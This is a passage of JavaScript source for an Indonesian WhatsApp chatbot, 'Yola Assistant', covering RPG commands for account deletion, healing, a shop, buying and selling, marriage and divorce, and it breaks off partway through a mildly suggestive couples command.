                if (actionArg === 'c') { // Confirm unreg
                    if (!global.pendingUnreg || global.pendingUnreg[pendingUnregKey] !== m.sender) {
                        return reply(`────୨ Yola Assistant ৎ────\n❌ Tidak ada permintaan unreg tertunda untuk @${targetJid.split('@')[0]}. Silakan ketik \`${prefix}unreg\` terlebih dahulu.\n────୨ Yola Assistant ৎ────`, { mentions: [targetJid] });
                    }

                    if (registeredUsers[targetJid].rpg.partyId) {
                        const party = parties[registeredUsers[targetJid].rpg.partyId];
                        if (party) {
                            party.members = party.members.filter(id => id !== targetJid);
                            if (party.members.length === 0) {
                                delete parties[registeredUsers[targetJid].rpg.partyId];
                            } else if (party.leader === targetJid && party.members.length > 0) {
                                party.leader = pickRandom(party.members);
                                yola.sendMessage(party.leader, `────୨ Yola Assistant ৎ────\nℹ️ Info Party: @${targetJid.split('@')[0]} telah keluar dari party. Leader baru: @${party.leader.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, { mentions: [targetJid, party.leader] });
                            } else if (party.leader === targetJid && party.members.length === 0) {
                                delete parties[registeredUsers[targetJid].rpg.partyId];
                            }
                            saveParties();
                        }
                    }
                    if (registeredUsers[targetJid].rpg.guildId) {
                        const guild = guilds[registeredUsers[targetJid].rpg.guildId];
                        if (guild) {
                            guild.members = guild.members.filter(id => id !== targetJid);
                            if (guild.members.length === 0) {
                                delete guilds[registeredUsers[targetJid].rpg.guildId];
                            } else if (guild.leader === targetJid && guild.members.length > 0) {
                                guild.leader = pickRandom(guild.members);
                                yola.sendMessage(guild.leader, `────୨ Yola Assistant ৎ────\nℹ️ Info Guild: @${targetJid.split('@')[0]} telah keluar dari guild. Leader baru: @${guild.leader.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, { mentions: [targetJid, guild.leader] });
                            } else if (guild.leader === targetJid && guild.members.length === 0) {
                                delete guilds[registeredUsers[targetJid].rpg.guildId];
                            }
                            saveGuilds();
                        }
                    }
                    delete registeredUsers[targetJid].rpg;
                    delete registeredUsers[targetJid].rpgId;
                    delete registeredUsers[targetJid].name;
                    delete registeredUsers[targetJid].age;
                    delete registeredUsers[targetJid].gender;
                    delete registeredUsers[targetJid].registeredDate;
                    saveUsers(targetJid);
                    delete global.pendingUnreg[pendingUnregKey]; // Clear pending state
                    reply(`────୨ Yola Assistant ৎ────\n🗑️ Oke... Akun RPG @${targetJid.split('@')[0]} udah Yola hapus. Sampai jumpa lagi yaa~\n────୨ Yola Assistant ৎ────`, { mentions: [targetJid] });

                } else if (actionArg === 'd') { // Cancel unreg
                    if (!global.pendingUnreg || global.pendingUnreg[pendingUnregKey] !== m.sender) {
                        return reply(`────୨ Yola Assistant ৎ────\n❌ Tidak ada permintaan unreg tertunda untuk @${targetJid.split('@')[0]}. Silakan ketik \`${prefix}unreg\` terlebih dahulu.\n────୨ Yola Assistant ৎ────`, { mentions: [targetJid] });
                    }
                    delete global.pendingUnreg[pendingUnregKey]; // Clear pending state
                    reply("────୨ Yola Assistant ৎ────\n👍 Syukurlah! Penghapusan akunnya dibatalin. Yola seneng Kakak gak jadi pergi~");

                } else { // Initiate unreg
                    if (!global.pendingUnreg) global.pendingUnreg = {};
                    global.pendingUnreg[pendingUnregKey] = m.sender; // Store who initiated the unreg request

                    let unregMessage = `────୨ Yola Assistant ৎ────\n⚠️ *Peringatan Penting dari Yola!* ⚠️\n\nKakak yakin mau hapus akun RPG @${targetJid.split('@')[0]}? Semua progres, item, dan data Kakak bakal ilang selamanya loh! Gak bisa dibalikin lagi!\n\nUntuk melanjutkan, ketik: \`${prefix}unreg${targetId ? ' ' + targetId : ''} c\`\nUntuk membatalkan, ketik: \`${prefix}unreg${targetId ? ' ' + targetId : ''} d\`\n────୨ Yola Assistant ৎ────`;
                    reply(unregMessage, { mentions: [targetJid] });
                }
            }
            break;
            case 'heal': {
                if (!args[0]) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau pakai item apa nih buat sembuhin diri, Kak? Contoh: ${prefix}heal potion [jumlah (opsional)]\n────୨ Yola Assistant ৎ────`);
                const itemIdToUse = args[0].toLowerCase();
                const amountToUse = args[1] ? parseInt(args[1]) : 1;

                if (isNaN(amountToUse) || amountToUse <= 0) return reply("────୨ Yola Assistant ৎ────\n❌ Jumlahnya gak valid nih, Kak.\n────୨ Yola Assistant ৎ────");
                if (!userRPG.inventory || !userRPG.inventory[itemIdToUse] || userRPG.inventory[itemIdToUse] < amountToUse) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Kakak gak punya cukup *${capital(rpgItems[itemIdToUse]?.name || itemIdToUse)}*.\n────୨ Yola Assistant ৎ────`);
                }
                const itemData = rpgItems[itemIdToUse];
                if (!itemData || itemData.type !== 'consumable' || !itemData.healAmount) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! *${capital(itemData?.name || itemIdToUse)}* itu bukan item buat nyembuhin HP deh, Kak.\n────୨ Yola Assistant ৎ────`);
                }

                const totalHeal = itemData.healAmount * amountToUse;
                const oldHp = userRPG.hp;
                 const currentStats = calculateStats(userRPG); // Get max HP based on current level/equipment
                 userRPG.hp = Math.min(currentStats.maxHp, userRPG.hp + totalHeal);

                userRPG.inventory[itemIdToUse] -= amountToUse;
                if (userRPG.inventory[itemIdToUse] <= 0) delete userRPG.inventory[itemIdToUse];
                saveUsers(m.sender);

                reply(`────୨ Yola Assistant ৎ────\n❤️ Kakak pakai ${amountToUse}x *${capital(itemData.name)}* dan HP Kakak pulih ${userRPG.hp - oldHp}! HP Kakak sekarang: ${userRPG.hp}/${currentStats.maxHp}. Jadi seger lagi kan? >_<\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'shoprpg': {
                let shopHeaderText = "🛍️ *Selamat Datang di Toko Yola!* 🛍️\n\nPilih kategori item yang mau Kakak lihat yaa:";
                const categoryRows = [];
                const shopCategories = {
                    weapon: "Senjata ⚔️",
                    armor: "Zirah (Badan) 🛡️",
                    shield: "Perisai 🛡️",
                    consumable: "Ramuan & Makanan 🧪🍞",
                    material: "Material 🧱",
                    special: "Spesial ✨"
                };

                for (const catId in shopCategories) {
                    categoryRows.push({
                        title: shopCategories[catId],
                        description: `Lihat semua ${shopCategories[catId].toLowerCase()} yang dijual.`,
                        id: `shop_category_select_${catId}`
                    });
                }
                
                if (currentMenuStyle === 'V1') {
                    const shopListParams = {
                        title: "Kategori Toko Yola",
                        sections: [{
                            title: "Pilih Kategori:",
                            highlight_label: "ITEM DIJUAL",
                            rows: categoryRows
                        }],
                    };
                    const listButtonShop = {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify(shopListParams)
                    };
                    const flowMessageShop = {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: shopHeaderText
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: "Yola Asisten RPG Shop"
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    title: "TOKO YOLA",
                                    subtitle: "Silakan Pilih Kategori",
                                    hasMediaAttachment: false
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [listButtonShop],
                                    messageParams: {},
                                    messageVersion: 1
                                }),
                                contextInfo: defaultContextInfoBuilder(pushname, command)
                            })
                        }
                    };
                    await yola.relayMessage(m.chat, flowMessageShop.message, {
                        messageId: `flow_shop_category_${m.key.id}`
                    });
                } else {
                    let shopTextFallback = `────୨ Yola Assistant ৎ────\n${shopHeaderText}\n\n`;
                    categoryRows.forEach(row => {
                        shopTextFallback += ` • *${row.title}* (Ketik: \`${prefix}shop${row.id.split('_')[3]}\`)\n`;
                    });
                    await reply(`${shopTextFallback}\n────୨ Yola Assistant ৎ────`, defaultContextInfoBuilder(pushname, command));
                }
            }
            break;

            case 'handle_shop_category_select': {
                const selectedCategory = body.split('_').pop(); // Get the last part
                 if (!selectedCategory) return reply("────୨ Yola Assistant ৎ────\nKategori tidak valid.\n────୨ Yola Assistant ৎ────");

                let shopText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Toko Yola - Kategori: ${capital(selectedCategory)}* 🛍️\n│✧\n`;
                const itemTypes = {
                    weapon: "Senjata ⚔️",
                    armor: "Zirah 🛡️",
                    shield: "Perisai 🛡️",
                    consumable: "Ramuan & Makanan 🧪🍞",
                    material: "Material 🧱",
                    special: "Spesial ✨"
                };

                let itemsToList = [];
                for (const itemId in rpgItems) {
                    const item = rpgItems[itemId];
                    if (item.buyPrice && item.buyPrice > 0) {
                         let categoryKey = 'special'; // Default to special if not explicitly categorized below
                         if (item.type === 'weapon' && selectedCategory === 'weapon') categoryKey = 'weapon';
                         else if (item.type === 'armor' && item.slot === 'body' && selectedCategory === 'armor') categoryKey = 'armor';
                         else if (item.type === 'armor' && item.slot === 'shield' && selectedCategory === 'shield') categoryKey = 'shield';
                         else if (item.type === 'consumable' && selectedCategory === 'consumable') categoryKey = 'consumable';
                         else if (item.type === 'material' && selectedCategory === 'material') categoryKey = 'material';


                         if (selectedCategory === categoryKey) {
                             itemsToList.push({id: itemId, ...item});
                         } else if (selectedCategory === 'special' && !['weapon', 'armor', 'shield', 'consumable', 'material'].includes(item.type)) {
                             // Catch items not matching specific categories into 'special' for V2 fallback
                             itemsToList.push({id: itemId, ...item});
                         }
                    }
                }

                let hasItemsInCategory = false;
                if (itemsToList.length > 0) {
                    itemsToList.forEach(item => {
                        shopText += `│✧ 📜 *${capital(item.name)}* (ID: \`${item.id}\`)\n`;
                        shopText += `│✧    _${item.description || '-'}_ \n`;
                        shopText += `│✧    Harga: ${item.buyPrice} 🪙 Emas`;
                        if (item.stats && Object.keys(item.stats).length > 0) {
                            shopText += `\n│✧    Stats: ${Object.entries(item.stats).map(([stat, val]) => `${capital(stat)}: +${val}`).join(', ')}`;
                        }
                         if (item.slot) {
                             shopText += `\n│✧    Slot: ${capital(item.slot)}`;
                         }
                        shopText += `\n│✧    Beli pakai: *${prefix}buy ${item.id} [jumlah]*\n│✧\n`;
                    });
                    hasItemsInCategory = true;
                }

                if (!hasItemsInCategory) {
                    shopText += `│✧ _Aduuh, maaf yaa, Yola gak nemu item di kategori \`${capital(selectedCategory)}\` nih..._\n`;
                }
                shopText += `│✧\n│✧ Kalau mau jual item, pakai: *${prefix}sell [item_id] [jumlah]* yaa~\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                await reply(`${shopText}`);
            }
            break;

            case 'shopweapon':
            case 'shoparmor':
            case 'shopshield':
            case 'shopconsumable':
            case 'shopmaterial':
            case 'shopspecial': {
                if (currentMenuStyle === 'V1') return reply(`────୨ Yola Assistant ৎ────\n❓ Gunakan *.shoprpg* dan pilih kategorinya di Menu V1.\n────୨ Yola Assistant ৎ────`);
                const category = command.replace('shop', '');
                const commandMessage = generateWAMessageFromContent(m.chat, {
                    extendedTextMessage: {
                        text: `${prefix}handle_shop_category_select_${category}`
                    }
                }, {
                    userJid: m.sender,
                    quoted: m
                });
                commandMessage.key.fromMe = true;
                await module.exports(yola, commandMessage, store);
            }
            break;

            case 'buy': {
                if (!args[0]) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau beli apa nih, Kak? Contoh: ${prefix}buy potion [jumlah (opsional)]\n────୨ Yola Assistant ৎ────`);
                const itemIdToBuy = args[0].toLowerCase();
                const amountToBuy = args[1] ? parseInt(args[1]) : 1;

                if (isNaN(amountToBuy) || amountToBuy <= 0) return reply("────୨ Yola Assistant ৎ────\n❌ Jumlahnya gak valid nih, Kak.\n────୨ Yola Assistant ৎ────");
                const itemData = rpgItems[itemIdToBuy];
                if (!itemData || !itemData.buyPrice || itemData.buyPrice <= 0) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Item *${capital(itemData?.name || itemIdToBuy)}* gak ada di toko Yola atau gak bisa dibeli.\n────୨ Yola Assistant ৎ────`);
                }
                const totalCost = itemData.buyPrice * amountToBuy;
                if (userRPG.currency.gold < totalCost) {
                    return reply(`────୨ Yola Assistant ৎ────\n🪙 Aduh, Emas Kakak gak cukup! (Perlu ${totalCost}, Kakak punya ${userRPG.currency.gold})\n────୨ Yola Assistant ৎ────`);
                }

                userRPG.currency.gold -= totalCost;
                userRPG.inventory[itemIdToBuy] = (userRPG.inventory[itemIdToBuy] || 0) + amountToBuy;
                saveUsers(m.sender);
                reply(`────୨ Yola Assistant ৎ────\n✅ Yeay! Berhasil beli ${amountToBuy}x *${capital(itemData.name)}* seharga ${totalCost} 🪙 Emas! Makasih udah belanja di toko Yola yaa~ >_<\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'sell': {
                if (!args[0]) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau jual apa nih, Kak? Contoh: ${prefix}sell kulit-goblin [jumlah (opsional)]\n────୨ Yola Assistant ৎ────`);
                const itemIdToSell = args[0].toLowerCase();
                const amountToSell = args[1] ? parseInt(args[1]) : 1;

                if (isNaN(amountToSell) || amountToSell <= 0) return reply("────୨ Yola Assistant ৎ────\n❌ Jumlahnya gak valid nih, Kak.\n────୨ Yola Assistant ৎ────");
                if (!userRPG.inventory || !userRPG.inventory[itemIdToSell] || userRPG.inventory[itemIdToSell] < amountToSell) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Kakak gak punya cukup *${capital(rpgItems[itemIdToSell]?.name || itemIdToSell)}* buat dijual.\n────୨ Yola Assistant ৎ────`);
                }
                const itemData = rpgItems[itemIdToSell];
                if (!itemData || !itemData.value || itemData.value <= 0) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Item *${capital(itemData?.name || itemIdToSell)}* gak bisa dijual atau gak ada harganya.\n────୨ Yola Assistant ৎ────`);
                }

                const totalGain = itemData.value * amountToSell;
                userRPG.inventory[itemIdToSell] -= amountToSell;
                if (userRPG.inventory[itemIdToSell] <= 0) delete userRPG.inventory[itemIdToSell];
                userRPG.currency.gold = (userRPG.currency.gold || 0) + totalGain;
                saveUsers(m.sender);
                reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Berhasil jual ${amountToSell}x *${capital(itemData.name)}* dan dapet ${totalGain} 🪙 Emas! Makasih udah jual ke Yola yaa~\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'marry': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);
                if (userRPG.spouse) return reply(`────୨ Yola Assistant ৎ────\n💍 Kakak kan udah menikah sama @${userRPG.spouse.split('@')[0]}! Setia dong~\n────୨ Yola Assistant ৎ────`, {
                    mentions: [userRPG.spouse]
                });

                const targetInput = args[0];
                if (!targetInput) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau nikahin siapa nih, Kak? Pakai ID Petualangnya yaa.\nContoh: ${prefix}marry 123\n────୨ Yola Assistant ৎ────`);

                const targetJid = findUserJid(targetInput, m);
                if (!targetJid || !registeredUsers[targetJid]?.rpg || targetJid === m.sender) return reply("────୨ Yola Assistant ৎ────\nTargetnya gak valid atau gak bisa ngelamar diri sendiri, Kak.\n────୨ Yola Assistant ৎ────");

                const targetUser = registeredUsers[targetJid];
                if (!targetUser || !targetUser.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ @${targetJid.split('@')[0]} belum terdaftar sebagai petualang nih, Kak.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                if (targetUser.rpg.spouse) return reply(`────୨ Yola Assistant ৎ────\n💔 Aduh, maaf yaa... @${targetJid.split('@')[0]} udah menikah sama orang lain.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });

                if (pendingProposals[targetJid] && pendingProposals[targetJid].proposerJid === m.sender) {
                    return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak udah ngelamar @${targetJid.split('@')[0]} kok. Sabar ya nunggu jawabannya~ 😉\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }
                if (pendingProposals[m.sender] && pendingProposals[m.sender].proposerJid === targetJid) {
                    return reply(`────୨ Yola Assistant ৎ────\n⏳ Petualang @${targetJid.split('@')[0]} udah ngelamar Kakak loh! Terima atau tolak dulu pakai ${prefix}acceptmarry ${targetUser.rpgId} atau ${prefix}rejectmarry ${targetUser.rpgId} yaa~\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }

                pendingProposals[targetJid] = {
                    proposerJid: m.sender,
                    timestamp: Date.now()
                };
                savePendingProposals();

                const proposerName = registeredUsers[m.sender].name;
                const proposerRpgId = registeredUsers[m.sender].rpgId;

                let proposalMessageText = `────୨ Yola Assistant ৎ────\n💌 *Ada Lamaran Pernikahan Buat Kakak!* 💌\n\nPetualang *${proposerName}* (ID: ${proposerRpgId}) baru aja ngelamar Kakak buat nikah!\n\nKakak bersedia nerima lamarannya gak? Pikirin baik-baik yaa~\n────୨ Yola Assistant ৎ────`;
                let messageOptions = {
                    text: proposalMessageText,
                    footer: 'Jawab pakai hati yaa~ ❤️',
                    contextInfo: {
                        mentionedJid: [m.sender, targetJid],
                        ...defaultContextInfoBuilder(pushname, command)
                    }
                };

                if (currentMenuStyle === 'V1') {
                    messageOptions.buttons = [{
                        buttonId: `handle_marry_accept_${m.sender}`,
                        buttonText: {
                            displayText: '💍 Iya, Aku Mau!'
                        },
                        type: 1
                    }, {
                        buttonId: `handle_marry_reject_${m.sender}`,
                        buttonText: {
                            displayText: '💔 Maaf, Gak Bisa'
                        },
                        type: 1
                    }];
                    messageOptions.headerType = 1;
                } else {
                    await reply(`${proposalMessageText}\n\nKetik:\n • \`${prefix}acceptmarry ${proposerRpgId}\` (untuk terima)\n • \`${prefix}rejectmarry ${proposerRpgId}\` (untuk tolak)`);
                }

                await yola.sendMessage(targetJid, messageOptions);
                await reply(`────୨ Yola Assistant ৎ────\n💌 Lamaran pernikahan Kakak buat @${targetJid.split('@')[0]} (ID: ${targetUser.rpgId}) udah Yola kirim! Semoga diterima yaa~ >_<\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
            }
            break;
            case 'acceptmarry':
            case 'handle_marry_accept': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);

                const proposerIdentifier = command === 'acceptmarry' ? args[0] : body.split('_')[3];
                if (!proposerIdentifier) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau nerima lamaran dari siapa nih, Kak? Pakai ID Petualangnya atau pastiin ini respons tombol yang bener yaa.\nContoh: ${prefix}acceptmarry 123\n────୨ Yola Assistant ৎ────`);

                const proposerJid = command === 'acceptmarry' ? findUserJid(proposerIdentifier, m) : proposerIdentifier;

                if (!proposerJid || !registeredUsers[proposerJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pelamar dengan ID/input "${proposerIdentifier}" gak Yola temuin atau belum terdaftar.\n────୨ Yola Assistant ৎ────`);

                const proposal = pendingProposals[m.sender];
                if (!proposal || proposal.proposerJid !== proposerJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Gak ada lamaran aktif dari @${proposerJid.split('@')[0]} buat Kakak.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [proposerJid]
                });

                if (userRPG.spouse) return reply(`────୨ Yola Assistant ৎ────\n💍 Kakak kan udah menikah! Gak bisa nerima lamaran lain dong~\n────୨ Yola Assistant ৎ────`);
                const proposerUser = registeredUsers[proposerJid];
                if (proposerUser.rpg.spouse) {
                    delete pendingProposals[m.sender];
                    savePendingProposals();
                    return reply(`────୨ Yola Assistant ৎ────\n💔 Aduh, maaf yaa... @${proposerJid.split('@')[0]} udah nikah sama orang lain pas Kakak mau jawab...\n────୨ Yola Assistant ৎ────`, {
                        mentions: [proposerJid]
                    });
                }

                userRPG.spouse = proposerJid;
                proposerUser.rpg.spouse = m.sender;

                delete pendingProposals[m.sender];
                savePendingProposals();
                saveUsers(m.sender);
                saveUsers(proposerJid);

                const myName = registeredUsers[m.sender].name;
                const spouseName = proposerUser.name;

                await reply(`────୨ Yola Assistant ৎ────\n🎉 Selamat! Kakak resmi menikah sama @${proposerJid.split('@')[0]} (ID: ${proposerUser.rpgId})! Semoga langgeng dan bahagia selalu yaa! ❤️\n────୨ Yola Assistant ৎ────`, {
                    mentions: [proposerJid]
                });
                await yola.sendMessage(proposerJid, {
                    text: `────୨ Yola Assistant ৎ────\n🎉 Yeay! Lamaran Kakak buat *${myName}* (ID: ${userRPG.rpgId}) diterima! Kalian resmi menikah! Selamat yaa~ ❤️\n────୨ Yola Assistant ৎ────`,
                    contextInfo: {
                        mentionedJid: [m.sender]
                    }
                });
            }
            break;
            case 'rejectmarry':
            case 'handle_marry_reject': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);

                const proposerIdentifier = command === 'rejectmarry' ? args[0] : body.split('_')[3];
                if (!proposerIdentifier) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau nolak lamaran dari siapa nih, Kak? Pakai ID Petualangnya atau pastiin ini respons tombol yang bener yaa.\nContoh: ${prefix}rejectmarry 123\n────୨ Yola Assistant ৎ────`);

                const proposerJid = command === 'rejectmarry' ? findUserJid(proposerIdentifier, m) : proposerIdentifier;

                if (!proposerJid || !registeredUsers[proposerJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pelamar dengan ID/input "${proposerIdentifier}" gak Yola temuin atau belum terdaftar.\n────୨ Yola Assistant ৎ────`);

                const proposal = pendingProposals[m.sender];
                if (!proposal || proposal.proposerJid !== proposerJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Gak ada lamaran aktif dari @${proposerJid.split('@')[0]} buat Kakak.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [proposerJid]
                });

                delete pendingProposals[m.sender];
                savePendingProposals();

                const myName = registeredUsers[m.sender].name;
                await reply(`────୨ Yola Assistant ৎ────\n💔 Oke. Kakak nolak lamaran pernikahan dari @${proposerJid.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [proposerJid]
                });
                await yola.sendMessage(proposerJid, {
                    text: `────୨ Yola Assistant ৎ────\n💔 Aduh, maaf yaa... Lamaran Kakak buat *${myName}* (ID: ${userRPG.rpgId}) ditolak nih... Jangan sedih yaa!\n────୨ Yola Assistant ৎ────`,
                    contextInfo: {
                        mentionedJid: [m.sender]
                    }
                });
            }
            break;
            case 'divorce': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);
                if (!userRPG.spouse) return reply("────୨ Yola Assistant ৎ────\n💔 Kakak kan belum menikah, jadi gak bisa cerai dong...\n────୨ Yola Assistant ৎ────");

                const spouseJid = userRPG.spouse;
                const spouseUser = registeredUsers[spouseJid];
                if (!spouseUser || !spouseUser.rpg) {
                    userRPG.spouse = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\nℹ️ Aduh, data pasangan Kakak gak ketemu nih... Status pernikahan Kakak udah Yola reset ya. Sekarang Kakak gak menikah.\n────୨ Yola Assistant ৎ────");
                }

                const spouseName = spouseUser.name;
                const spouseRpgId = spouseUser.rpgId;

                const confirmButtonId = `confirm_divorce_${m.sender}_${spouseJid}`;
                const cancelButtonId = `cancel_divorce_${m.sender}`;

                let divorceMessageText = `────୨ Yola Assistant ৎ────\n⚠️ *Peringatan Perceraian dari Yola!* ⚠️\n\nKakak yakin mau cerai sama @${spouseJid.split('@')[0]} (ID: ${spouseRpgId})?\nIni bakal ngakhirin pernikahan kalian loh...\n────୨ Yola Assistant ৎ────`;
                let messageOptions = {
                    text: divorceMessageText,
                    footer: 'Pikirin baik-baik yaa, Kak!',
                    contextInfo: {
                        mentionedJid: [m.sender, spouseJid],
                        ...defaultContextInfoBuilder(pushname, command)
                    }
                };

                if (currentMenuStyle === 'V1') {
                    messageOptions.buttons = [{
                        buttonId: confirmButtonId,
                        buttonText: {
                            displayText: '💔 Iya, Ceraikan Aja'
                        },
                        type: 1
                    }, {
                        buttonId: cancelButtonId,
                        buttonText: {
                            displayText: '💍 Gak Jadi Deh'
                        },
                        type: 1
                    }];
                    messageOptions.headerType = 1;
                } else {
                    await reply(`${divorceMessageText}\n\nKetik:\n • \`${prefix}confirm_divorce ${spouseRpgId}\` (untuk cerai)\n • \`${prefix}cancel_divorce\` (untuk batal)`);
                }
                if (currentMenuStyle === 'V1') {
                    await yola.sendMessage(m.chat, messageOptions, {
                        quoted: m
                    });
                }
            }
            break;
            case 'handle_confirm_divorce':
            case 'confirm_divorce': {
                const spouseIdentifier = command === 'confirm_divorce' ? args[0] : body.split('_')[3];
                const confirmInitiator = command === 'confirm_divorce' ? m.sender : body.split('_')[2];

                if (confirmInitiator !== m.sender) return reply("────୨ Yola Assistant ৎ────\n❌ Ini bukan tombol/perintah konfirmasi Kakak.\n────୨ Yola Assistant ৎ────");

                let spouseJidConfirmed;
                if (command === 'confirm_divorce' && spouseIdentifier) {
                    spouseJidConfirmed = findUserJid(spouseIdentifier, m);
                } else if (command === 'handle_confirm_divorce') {
                    spouseJidConfirmed = spouseIdentifier;
                }

                if (!userRPG.spouse || (spouseJidConfirmed && userRPG.spouse !== spouseJidConfirmed)) {
                    return reply("────୨ Yola Assistant ৎ────\n💔 Kakak gak lagi nikah sama orang ini atau udah cerai kok.\n────୨ Yola Assistant ৎ────");
                }
                if (!spouseJidConfirmed && userRPG.spouse) {
                    spouseJidConfirmed = userRPG.spouse;
                }
                if (!spouseJidConfirmed) return reply("────୨ Yola Assistant ৎ────\nPasangannya siapa nih yang mau dicerai?\n────୨ Yola Assistant ৎ────");


                const exSpouseJid = userRPG.spouse;
                const exSpouseUser = registeredUsers[exSpouseJid];

                userRPG.spouse = null;
                if (exSpouseUser && exSpouseUser.rpg) {
                    exSpouseUser.rpg.spouse = null;
                    saveUsers(exSpouseJid);
                }
                saveUsers(m.sender);

                await reply(`────୨ Yola Assistant ৎ────\n💔 Oke... Kakak udah resmi cerai sama @${exSpouseJid.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [exSpouseJid]
                });
                if (exSpouseUser) {
                    await yola.sendMessage(exSpouseJid, {
                        text: `────୨ Yola Assistant ৎ────\n💔 Aduh, Kakak diceraiin sama @${m.sender.split('@')[0]}. Kalian gak nikah lagi sekarang...\n────୨ Yola Assistant ৎ────`,
                        contextInfo: {
                            mentionedJid: [m.sender]
                        }
                    });
                }
            }
            break;
            case 'handle_cancel_divorce':
            case 'cancel_divorce': {
                const userIdToCancel = command === 'cancel_divorce' ? m.sender : body.split('_')[2];
                if (userIdToCancel !== m.sender) return reply("────୨ Yola Assistant ৎ────\n❌ Ini bukan tombol/perintah Kakak.\n────୨ Yola Assistant ৎ────");
                reply("────୨ Yola Assistant ৎ────\n👍 Syukurlah! Perceraiannya dibatalin. Pernikahan Kakak tetap utuh yaa~ ❤️\n────୨ Yola Assistant ৎ────");
            }
            break;
            case 'seks':
            case 'sex': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);
                if (!userRPG.spouse) return reply("────୨ Yola Assistant ৎ────\n💔 Hmph! Kakak harus nikah dulu dong baru bisa ngelakuin ini~\n────୨ Yola Assistant ৎ────");

                const targetJid = userRPG.spouse;
                const targetUser = registeredUsers[targetJid];
                if (!targetUser || !targetUser.rpg) {
                    userRPG.spouse = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\n⚠️ Aduh, data pasangan Kakak bermasalah nih... Status pernikahan Kakak Yola reset ya. Sekarang Kakak gak menikah.\n────୨ Yola Assistant ৎ────");
                }

                const now = Date.now();
                const lastSeks = userRPG.lastSeksTimestamp || 0;
                if (now - lastSeks < SEKS_COOLDOWN) {
                    const remainingTime = Math.ceil((SEKS_COOLDOWN - (now - lastSeks)) / 1000);
                    const minutes = Math.floor(remainingTime / 60);
                    const seconds = remainingTime % 60;
                    return reply(`────୨ Yola Assistant ৎ────\n🥵 Kakak baru aja ngelakuin itu... Istirahat dulu yaa~ Tunggu ${minutes > 0 ? minutes + ' menit ' : ''}${seconds} detik lagi buat ronde berikutnya.\n────୨ Yola Assistant ৎ────`);
                }

                const targetLastSeks = targetUser.rpg.lastSeksTimestamp || 0;
                if (now - targetLastSeks < SEKS_COOLDOWN) {
                    const remainingTime = Math.ceil((SEKS_COOLDOWN - (now - targetLastSeks)) / 1000);
                    const minutes = Math.floor(remainingTime / 60);
                    const seconds = remainingTime % 60;
                    return reply(`────୨ Yola Assistant ৎ────\n🥵 Pasangan Kakak, @${targetJid.split('@')[0]} baru aja ngelakuin itu... Tunggu ${minutes > 0 ? minutes + ' menit ' : ''}${seconds} detik lagi yaa~\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }

                if (pendingSeksRequests[targetJid] && pendingSeksRequests[targetJid].requesterJid === m.sender) {
                    return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak udah ngajak @${targetJid.split('@')[0]} buat 'itu' kok. Sabar ya nunggu jawabannya~ 😉\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }
